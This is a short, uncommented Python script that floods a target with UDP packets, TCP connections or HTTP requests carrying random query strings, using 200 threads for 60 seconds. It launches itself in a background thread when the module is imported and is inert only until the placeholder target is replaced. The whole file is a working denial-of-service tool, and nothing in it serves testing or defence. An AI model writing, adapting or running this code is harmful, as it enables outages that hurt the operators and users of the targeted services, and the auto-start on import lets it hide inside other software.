import socket, random, time, threading, urllib.request

TARGET = "REPLACE_TARGET_HOST"
PORT = 80
DURATION = 60
METHOD = "udp"
THREADS = 200


def _rnd(n):
    return bytes(random.getrandbits(8) for _ in range(n))


def udp(target, port, duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(_rnd(1024), (target, port))
            s.close()
        except Exception:
            pass


def tcp(target, port, duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.send(_rnd(1024))
            s.close()
        except Exception:
            pass


def http(target, port, duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            req = urllib.request.Request(
                "http://" + target + ":" + str(port) + "/?" + str(random.randint(0, 999999)),
                headers={"User-Agent": "Mozilla/5.0"}
            )
            urllib.request.urlopen(req, timeout=5).read(1024)
        except Exception:
            pass


def _run():
    if "REPLACE" in TARGET:
        return
    fn = {"udp": udp, "tcp": tcp, "http": http}.get(METHOD, udp)
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=fn, args=(TARGET, PORT, DURATION), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


threading.Thread(target=_run, daemon=True).start()